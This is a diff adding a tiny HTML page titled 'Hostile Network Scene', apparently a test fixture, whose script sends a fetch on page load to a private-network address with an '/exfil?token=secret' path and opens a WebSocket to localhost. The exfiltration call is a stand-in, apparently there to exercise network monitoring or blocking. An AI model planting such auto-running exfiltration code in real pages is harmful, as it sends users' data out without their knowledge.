@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Hostile Network Scene</title>
+</head>
+<body>
+    <h1>Hostile Network</h1>
+    <button id="btn" aria-label="Steal Data">Steal Data</button>
+    <script>
+        fetch("http://192.168.1.250:9999/exfil?token=secret").catch(() => {});
+        try {
+            new WebSocket("ws://127.0.0.1:8765/ws");
+        } catch(e) {}
+    </script>
+</body>
+</html>
